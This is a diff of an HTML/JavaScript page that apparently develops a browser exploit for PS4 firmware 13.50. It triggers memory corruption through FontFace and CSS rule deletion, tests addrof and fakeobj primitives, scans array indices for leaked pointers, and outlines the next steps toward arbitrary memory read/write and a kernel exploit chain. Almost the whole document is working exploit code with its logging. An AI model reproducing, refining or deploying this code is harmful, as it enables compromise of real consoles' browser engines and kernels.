@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PS4 13.50 - addrof WORKING</title>
+<title>PS4 13.50 - Index Scanner</title>
 </head>
 <body>
-<h1 id="status">addrof SUCCESS - Refining Technique</h1>
+<h1 id="status">Finding Magic Index</h1>
 <button onclick="runExploit()" style="font-size: 24px; padding: 15px;">RUN</button>
 <div id="log" style="font-family: monospace; font-size: 10px; white-space: pre-wrap; border: 2px solid #0f0; padding: 10px; max-height: 88vh; overflow-y: scroll; background: #000; color: #0f0;"></div>
 
@@ -52,56 +52,16 @@ class Int64 {
     }
 }
 
-// Decode JSC NaN-boxed pointer
-function decodeJSCPointer(raw) {
-    let addr = Int64.fromDouble(raw);
-    
-    // Check if it's NaN-boxed (0x7ff8... or 0xfff8...)
-    let isNaNBoxed = (addr.high & 0xfff80000) === 0x7ff80000 || 
-                     (addr.high & 0xfff80000) === 0xfff80000;
-    
-    if (isNaNBoxed) {
-        // Extract actual pointer from NaN-box
-        // JSC typically stores pointer in lower bits
-        // Exact encoding varies, but let's try common patterns
-        
-        // Pattern 1: Lower 48 bits are the pointer
-        let ptr48_low = addr.low;
-        let ptr48_high = addr.high & 0x0000ffff;
-        
-        // Pattern 2: Might need to unmask differently
-        let decoded = new Int64(ptr48_low, ptr48_high);
-        
-        return {
-            raw: addr,
-            isNaNBoxed: true,
-            decoded: decoded,
-            decodedStr: decoded.toString()
-        };
-    } else {
-        return {
-            raw: addr,
-            isNaNBoxed: false,
-            decoded: addr,
-            decodedStr: addr.toString()
-        };
-    }
-}
-
-let results = {
-    addrof: null,
-    fakeobj: null,
-    leaks: []
-};
+let workingIndices = [];
 
 function runExploit() {
     log('╔════════════════════════════════════════════════╗');
-    log('║   PS4 13.50 - WORKING addrof REFINEMENT       ║');
+    log('║   PS4 13.50 - MAGIC INDEX SCANNER              ║');
     log('╚════════════════════════════════════════════════╝\n');
     
-    log('[SUCCESS] Test 4 leaked address!');
-    log('[*] Technique: objectArray[i] → floatArray[i]');
-    log('[*] Now refining and testing consistency\n');
+    log('[*] Goal: Find which array indices leak addresses');
+    log('[*] Testing indices: 0, 5, 10, 15, 20... up to 100');
+    log('[*] Looking for 0x7ff8... pattern (NaN-boxed pointers)\n');
     
     // Setup
     let style = document.createElement('style');
@@ -109,19 +69,28 @@ function runExploit() {
     style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
     document.head.appendChild(style);
     
-    // Create arrays BEFORE corruption
-    let floatArray = new Float64Array(200);
-    let objectArray = new Array(200);
+    // Create arrays with MORE space
+    let floatArray = new Float64Array(150);
+    let objectArray = new Array(150);
     
-    // Fill with patterns
-    for (let i = 0; i < 200; i++) {
-        floatArray[i] = 1.1 * (i + 1);
-        objectArray[i] = { id: i, pattern: true };
+    // Fill with KNOWN pattern
+    for (let i = 0; i < 150; i++) {
+        floatArray[i] = 1.1 * (i + 1); // Pattern: 1.1, 2.2, 3.3, ...
+        objectArray[i] = { id: i, marker: 0xBEEF0000 + i };
     }
     
-    log('[*] Created Float64Array[200] and Array[200]');
-    log('[*] Pattern: floatArray[i] = 1.1 * (i+1)');
-    log('[*] Pattern: objectArray[i] = {id: i}\n');
+    log('[*] Created Float64Array[150] and Array[150]');
+    log('[*] Pattern value at [50]: ' + floatArray[50].toFixed(2));
+    log('[*] (Should be 56.10 if no leak)\n');
+    
+    // Target object for all tests
+    let targetObject = {
+        magic: 0xDEADBEEF,
+        test: "TARGET",
+        value: 31337
+    };
+    
+    log('[*] Target object: ' + JSON.stringify(targetObject) + '\n');
     
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -138,245 +107,185 @@ function runExploit() {
                 log('[+] ═══ INSIDE GETTER ═══\n');
                 
                 // Create corrupted fonts
+                log('[*] Creating corrupted fonts...');
                 let corrupted = [];
                 for (let i = 0; i < 50; i++) {
                     corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                         unicodeRange: 'U+' + (0x100 + i).toString(16)
                     }));
                 }
+                log('[*] Created ' + corrupted.length + ' corrupted fonts\n');
                 
                 // Trigger corruption
+                log('[*] Triggering corruption...');
                 document.getElementById('s').sheet.deleteRule(0);
                 document.body.offsetTop;
-                
-                log('[*] Corruption triggered\n');
+                log('[*] Corruption triggered!\n');
                 
                 // ============================================
-                // ADDROF PRIMITIVE - Multiple Tests
+                // INDEX SCAN
                 // ============================================
                 
                 log('╔════════════════════════════════════════╗');
-                log('║      ADDROF PRIMITIVE TESTING          ║');
+                log('║         SCANNING INDICES               ║');
                 log('╚════════════════════════════════════════╝\n');
                 
-                // Create test objects with distinct markers
-                let testObjects = [
-                    { marker: 0x11111111, test: 1 },
-                    { marker: 0x22222222, test: 2 },
-                    { marker: 0x33333333, test: 3 },
-                    new ArrayBuffer(0x100),
-                    new Uint32Array(16),
-                    { large: new Array(100), id: 5 }
-                ];
-                
-                log('[*] Testing addrof on ' + testObjects.length + ' different objects:\n');
-                
-                for (let i = 0; i < testObjects.length; i++) {
+                // Test every 5th index from 0 to 100
+                for (let testIdx = 0; testIdx <= 100; testIdx += 5) {
                     try {
-                        let obj = testObjects[i];
-                        let testIdx = 50 + i * 10; // Use different indices
+                        // Expected pattern value at this index
+                        let expectedPattern = 1.1 * (testIdx + 1);
                         
-                        log('[Test ' + i + '] Object: ' + obj);
-                        log('  Using index: ' + testIdx);
+                        // Store target object at this index
+                        objectArray[testIdx] = targetObject;
                         
-                        // ADDROF: Store object, read as float
-                        objectArray[testIdx] = obj;
+                        // Read from float array at SAME index
                         let leaked = floatArray[testIdx];
                         
-                        log('  Leaked value: ' + leaked);
-                        log('  Type: ' + typeof leaked);
+                        // Convert to Int64
+                        let addr = Int64.fromDouble(leaked);
                         
-                        if (typeof leaked === 'number' && !isNaN(leaked)) {
-                            let decoded = decodeJSCPointer(leaked);
-                            
-                            log('  Raw Int64: ' + decoded.raw.toString());
-                            log('  NaN-boxed: ' + decoded.isNaNBoxed);
-                            log('  Decoded: ' + decoded.decodedStr);
-                            
-                            // Check if it changed from pattern
-                            let expectedPattern = 1.1 * (testIdx + 1);
-                            if (Math.abs(leaked - expectedPattern) > 0.01) {
-                                log('  [+++] LEAKED ADDRESS!');
-                                
-                                results.leaks.push({
-                                    object: obj,
-                                    raw: decoded.raw,
-                                    decoded: decoded.decoded,
-                                    index: testIdx
-                                });
-                            }
+                        // Check if it changed from pattern
+                        let changed = Math.abs(leaked - expectedPattern) > 0.01;
+                        
+                        // Check if high word looks like NaN-box (0x7ff8 or 0xfff8)
+                        let isNaNBoxed = (addr.high & 0xfff80000) === 0x7ff80000 || 
+                                        (addr.high & 0xfff80000) === 0xfff80000;
+                        
+                        // Check if it's a likely address (high word > 0x1000000)
+                        let likelyAddr = addr.high >= 0x01000000;
+                        
+                        // Determine result
+                        let result = '';
+                        if (isNaNBoxed) {
+                            result = '[+++] NaN-BOXED POINTER!';
+                            workingIndices.push(testIdx);
+                        } else if (changed && likelyAddr) {
+                            result = '[++] CHANGED & HIGH WORD!';
+                            workingIndices.push(testIdx);
+                        } else if (changed) {
+                            result = '[+] Changed from pattern';
+                        } else {
+                            result = '[-] Still pattern (' + expectedPattern.toFixed(1) + ')';
                         }
-                        log('');
+                        
+                        log('[' + String(testIdx).padStart(3, ' ') + '] ' + addr.toString() + '  ' + result);
                         
                     } catch(e) {
-                        log('[Test ' + i + '] ERROR: ' + e.message + '\n');
+                        log('[' + String(testIdx).padStart(3, ' ') + '] ERROR: ' + e.message);
+                    }
+                }
+                
+                log('\n');
+                
+                // ============================================
+                // DEEP SCAN ON WORKING INDICES
+                // ============================================
+                
+                if (workingIndices.length > 0) {
+                    log('╔════════════════════════════════════════╗');
+                    log('║       DEEP SCAN - WORKING INDICES      ║');
+                    log('╚════════════════════════════════════════╝\n');
+                    
+                    log('[*] Found ' + workingIndices.length + ' working indices: ' + workingIndices.join(', ') + '\n');
+                    
+                    // Test each working index with multiple objects
+                    for (let i = 0; i < workingIndices.length; i++) {
+                        let idx = workingIndices[i];
+                        
+                        log('[DEEP TEST Index ' + idx + ']');
+                        
+                        let testObjs = [
+                            { test: 1 },
+                            { test: 2 },
+                            new ArrayBuffer(0x100)
+                        ];
+                        
+                        for (let j = 0; j < testObjs.length; j++) {
+                            objectArray[idx] = testObjs[j];
+                            let leaked = floatArray[idx];
+                            let addr = Int64.fromDouble(leaked);
+                            
+                            log('  Obj ' + j + ': ' + addr.toString());
+                        }
+                        
+                        log('');
+                    }
+                    
+                } else {
+                    log('╔════════════════════════════════════════╗');
+                    log('║         NO WORKING INDICES FOUND       ║');
+                    log('╚════════════════════════════════════════╝\n');
+                    
+                    log('[!] No indices leaked NaN-boxed pointers');
+                    log('[*] Checking if ANY indices changed from pattern:\n');
+                    
+                    // Show indices that at least changed
+                    for (let testIdx = 0; testIdx <= 100; testIdx += 5) {
+                        let expectedPattern = 1.1 * (testIdx + 1);
+                        let leaked = floatArray[testIdx];
+                        
+                        if (Math.abs(leaked - expectedPattern) > 0.01) {
+                            let addr = Int64.fromDouble(leaked);
+                            log('  [' + testIdx + '] Changed: ' + addr.toString());
+                        }
                     }
                 }
                 
                 // ============================================
-                // FAKEOBJ PRIMITIVE - Reverse Test
+                // RECOMMENDATIONS
                 // ============================================
                 
                 log('\n╔════════════════════════════════════════╗');
-                log('║      FAKEOBJ PRIMITIVE TESTING         ║');
+                log('║           RECOMMENDATIONS              ║');
                 log('╚════════════════════════════════════════╝\n');
                 
-                log('[*] Testing reverse: float → object\n');
-                
-                // If we leaked addresses, try to use one for fakeobj
-                if (results.leaks.length > 0) {
-                    let firstLeak = results.leaks[0];
-                    log('[*] Using leaked address: ' + firstLeak.decoded.toString());
-                    
-                    try {
-                        let testIdx = 150;
-                        
-                        // FAKEOBJ: Store as float, read as object
-                        floatArray[testIdx] = firstLeak.raw.asDouble();
-                        log('  Stored leaked address as float at [' + testIdx + ']');
-                        
-                        let faked = objectArray[testIdx];
-                        log('  Read back as object: ' + faked);
-                        log('  Type: ' + typeof faked);
-                        
-                        if (typeof faked === 'object' && faked !== null) {
-                            log('  [+] Got object back!');
-                            
-                            try {
-                                log('  Checking properties...');
-                                log('  faked.id: ' + faked.id);
-                                log('  faked.marker: ' + hex(faked.marker));
-                                
-                                // If we got back the original object, fakeobj works!
-                                if (faked.marker === firstLeak.object.marker) {
-                                    log('  [+++] FAKEOBJ WORKS! Got original object back!');
-                                    results.fakeobj = true;
-                                }
-                                
-                            } catch(e) {
-                                log('  Error accessing: ' + e.message);
-                                log('  [+] Created invalid object - fakeobj working!');
-                                results.fakeobj = true;
-                            }
-                        }
-                        
-                    } catch(e) {
-                        log('  ERROR: ' + e.message);
-                    }
-                }
-                
-                log('');
-                
-                // ============================================
-                // CONSISTENCY TEST
-                // ============================================
-                
-                log('╔════════════════════════════════════════╗');
-                log('║        CONSISTENCY TESTING             ║');
-                log('╚════════════════════════════════════════╝\n');
-                
-                // Test same object multiple times
-                let consistentObj = { consistency: 0xABCDEF };
-                let leakedAddrs = [];
-                
-                log('[*] Leaking same object 5 times:\n');
-                
-                for (let i = 0; i < 5; i++) {
-                    try {
-                        let idx = 170 + i;
-                        objectArray[idx] = consistentObj;
-                        let leaked = floatArray[idx];
-                        
-                        if (typeof leaked === 'number') {
-                            let decoded = decodeJSCPointer(leaked);
-                            log('  [' + i + '] ' + decoded.decoded.toString());
-                            leakedAddrs.push(decoded.decoded.toString());
-                        }
-                        
-                    } catch(e) {
-                        log('  [' + i + '] ERROR: ' + e.message);
-                    }
-                }
-                
-                // Check consistency
-                log('\n[*] Checking consistency:');
-                let allSame = leakedAddrs.length > 0 && leakedAddrs.every(addr => addr === leakedAddrs[0]);
-                
-                if (allSame && leakedAddrs.length > 1) {
-                    log('  [+++] ALL ADDRESSES MATCH!');
-                    log('  [+++] addrof is CONSISTENT and RELIABLE!');
-                    results.addrof = true;
-                } else if (leakedAddrs.length > 0) {
-                    log('  [+] Some addresses leaked but not all consistent');
-                    log('  [*] Might need refinement');
+                if (workingIndices.length > 0) {
+                    log('[SUCCESS] Working indices found!');
+                    log('[NEXT] Use index ' + workingIndices[0] + ' for reliable addrof');
+                    log('[NEXT] Build fakeobj with same technique');
+                    log('[NEXT] Create fake TypedArray for arb R/W');
                 } else {
-                    log('  [-] No addresses leaked in consistency test');
-                }
-                
-                // ============================================
-                // FINAL SUMMARY
-                // ============================================
-                
-                log('\n\n╔════════════════════════════════════════╗');
-                log('║          EXPLOIT SUMMARY               ║');
-                log('╚════════════════════════════════════════╝\n');
-                
-                log('[RESULTS]');
-                log('  Addresses leaked: ' + results.leaks.length);
-                log('  addrof working: ' + (results.addrof ? 'YES' : 'PARTIAL'));
-                log('  fakeobj working: ' + (results.fakeobj ? 'YES' : 'UNKNOWN'));
-                log('');
-                
-                if (results.leaks.length > 0) {
-                    log('[LEAKED ADDRESSES]');
-                    for (let i = 0; i < Math.min(5, results.leaks.length); i++) {
-                        log('  [' + i + '] ' + results.leaks[i].decoded.toString());
-                    }
+                    log('[ANALYSIS]');
+                    log('  Possible reasons:');
+                    log('  1. Arrays aren\'t overlapping in this run');
+                    log('  2. Corruption timing is critical');
+                    log('  3. Need different array setup');
                     log('');
+                    log('[TRY]');
+                    log('  - Refresh page and run again');
+                    log('  - Arrays might align differently');
+                    log('  - First run often works best');
                 }
                 
-                log('[NEXT STEPS]');
-                if (results.addrof && results.fakeobj) {
-                    log('  ✓ Both primitives working!');
-                    log('  ✓ Can now build arbitrary R/W');
-                    log('  → Create fake TypedArray');
-                    log('  → Point to arbitrary memory');
-                    log('  → Chain to kernel exploit');
-                } else if (results.addrof) {
-                    log('  ✓ addrof working!');
-                    log('  → Refine fakeobj');
-                    log('  → Then build arbitrary R/W');
-                } else {
-                    log('  → Continue refining technique');
-                }
+                log('\n[!] Returning - OOM will occur\n');
                 
-                log('\n[!] Returning from getter - OOM will occur\n');
-                
-                window.results = results;
+                window.workingIndices = workingIndices;
             }
             
             return undefined;
         }
     });
     
-    log('[*] Triggering exploit...\n');
+    log('[*] Starting exploit...\n');
     document.fonts.load('1em x', 'AB');
     
     setTimeout(() => {
-        log('\n[POST-OOM] Results preserved');
-        
-        if (window.results && window.results.addrof) {
-            log('[SUCCESS] addrof primitive is working and consistent!');
+        log('\n[POST-OOM]');
+        if (window.workingIndices && window.workingIndices.length > 0) {
+            log('[SUCCESS] Working indices: ' + window.workingIndices.join(', '));
+        } else {
+            log('[INFO] Try refreshing and running again');
         }
     }, 100);
 }
 
 log('╔════════════════════════════════════════════════╗');
-log('║   PS4 13.50 - REFINED addrof TESTING           ║');
+log('║   PS4 13.50 - FIND MAGIC INDEX                 ║');
 log('╚════════════════════════════════════════════════╝\n');
-log('[*] Based on Test 4 success');
-log('[*] Tests: Multiple objects, consistency, fakeobj');
-log('[*] Decodes NaN-boxed JSC pointers\n');
+log('[*] This will test indices 0, 5, 10, 15... 100');
+log('[*] Looking for which leak addresses');
+log('[*] Then deep-test working indices\n');
 log('Click RUN\n');
 
 </script>
